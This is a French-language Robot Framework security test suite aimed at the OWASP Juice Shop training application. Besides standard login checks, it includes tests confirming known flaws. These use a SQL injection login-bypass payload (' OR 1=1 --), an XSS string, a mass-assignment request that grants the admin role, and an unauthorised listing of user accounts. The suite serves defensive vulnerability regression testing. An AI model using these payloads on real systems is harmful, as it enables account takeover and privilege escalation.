*** Settings ***
Documentation       Tests de sécurité via l'API REST + vérifications OWASP Top 10 (cible : OWASP Juice Shop)
...
...                 Ce fichier contient 2 catégories de tests, clairement séparées :
...                 1. Tests de comportement standard (login, XSS) -> doivent PASSER
...                 2. Tests de CONFIRMATION DE FAILLE (tag "vulnerabilite-confirmee") -> passent
...                    quand la faille est PRÉSENTE (documentation), et échoueraient si l'app
...                    était un jour corrigée (test de non-régression de vulnérabilité).
Resource             ../resources/variables.robot
Resource             ../resources/keywords.robot
Suite Setup          Creer Session API
Test Tags            api    owasp


*** Test Cases ***
# ==================================================================
# Comportements standards attendus
# ==================================================================
Login API Avec Identifiants Valides Retourne 200
    [Documentation]    Nécessite un compte créé au préalable via /#/register
    ${response}=    Envoyer Requete Login    ${VALID_USER}    ${VALID_PASSWORD}
    Verifier Code Statut    ${response}    200

Login API Avec Mot De Passe Incorrect Retourne 401
    ${response}=    Envoyer Requete Login    ${VALID_USER}    ${INVALID_PASSWORD}
    Verifier Code Statut    ${response}    401

Payload XSS Sur Endpoint Login Nest Pas Reflete
    [Documentation]    Vérifie que le payload XSS n'est pas renvoyé tel quel dans la réponse
    ${response}=    Envoyer Requete Login    ${XSS_PAYLOAD}    test123
    Should Not Contain    ${response.text}    <script>alert('x')</script>


# ==================================================================
# Confirmation de failles réelles découvertes (tests verts = faille
# présente et documentée ; passeraient au rouge si l'app était corrigée)
# ==================================================================
[FAILLE] Bypass Authentification Via Injection SQL
    [Documentation]    Broken Authentication (OWASP API2:2023). Le endpoint /rest/user/login
    ...    accepte le payload ' OR 1=1 -- dans email/password et authentifie l'attaquant
    ...    sans connaître de vrai mot de passe. CVE/challenge historique connu de Juice Shop.
    [Tags]    vulnerabilite-confirmee
    ${response}=    Envoyer Requete Login    ${SQLI_PAYLOAD}    ${SQLI_PAYLOAD}
    Verifier Code Statut    ${response}    200
    Log    FAILLE CONFIRMÉE : bypass d'authentification SQLi réussi (code 200 obtenu)    console=True

[FAILLE] Acces Non Autorise A La Liste Des Utilisateurs
    [Documentation]    Broken Function Level Authorization (OWASP API5:2023). GET /api/Users
    ...    renvoie les données complètes même avec le token d'un utilisateur NON-admin :
    ...    le contrôle de rôle n'existe que côté frontend (route /administration), pas
    ...    côté backend sur cet endpoint précis.
    [Tags]    vulnerabilite-confirmee
    ${session}=    Envoyer Requete Login    ${NORMAL_USER}    ${NORMAL_PASSWORD}
    Verifier Code Statut    ${session}    200
    ${token}=    Recuperer Token Depuis Reponse    ${session}
    ${headers}=    Create Dictionary    Authorization=Bearer ${token}
    ${response}=    GET On Session    api    /api/Users    headers=${headers}    expected_status=any
    Verifier Code Statut    ${response}    200
    Log    FAILLE CONFIRMÉE : utilisateur non-admin a pu lister tous les comptes (code 200)    console=True

[FAILLE] Mass Assignment Sur Inscription Permet De Devenir Admin
    [Documentation]    Mass Assignment (OWASP API3:2023). POST /api/Users n'ignore pas
    ...    le champ "role" envoyé par le client : un attaquant peut s'auto-attribuer
    ...    le rôle admin dès l'inscription, sans aucune vérification serveur.
    ...    NOTE : si ce test renvoie 400 au lieu de 201, c'est probablement que l'email
    ...    utilisé existe déjà (Juice Shop refuse les doublons) — change l'email ci-dessous.
    [Tags]    vulnerabilite-confirmee
    ${body}=    Create Dictionary
    ...    email=mass-assignment-poc-final@example.com
    ...    password=Poc123!
    ...    role=admin
    ${response}=    POST On Session    api    /api/Users    json=${body}    expected_status=any
    Run Keyword If    ${response.status_code} != 201    Log    Erreur serveur : ${response.text}    console=True
    Verifier Code Statut    ${response}    201
    ${created_role}=    Set Variable    ${response.json()}[data][role]
    Should Be Equal As Strings    ${created_role}    admin
    Log    FAILLE CONFIRMÉE : rôle "admin" obtenu via simple inscription    console=True


[FAILLE] En Tete HSTS Absent
    [Documentation]    Security Misconfiguration (OWASP A05:2021). Le header
    ...    Strict-Transport-Security n'est pas présent sur la réponse racine.
    [Tags]    vulnerabilite-confirmee
    ${response}=    GET On Session    api    /    expected_status=any
    Dictionary Should Not Contain Key    ${response.headers}    Strict-Transport-Security
    Log    FAILLE CONFIRMÉE : header HSTS absent    console=True

[FAILLE] En Tete CSP Absent
    [Documentation]    Security Misconfiguration (OWASP A05:2021). Le header
    ...    Content-Security-Policy n'est pas présent sur la réponse racine.
    [Tags]    vulnerabilite-confirmee
    ${response}=    GET On Session    api    /    expected_status=any
    Dictionary Should Not Contain Key    ${response.headers}    Content-Security-Policy
    Log    FAILLE CONFIRMÉE : header CSP absent    console=True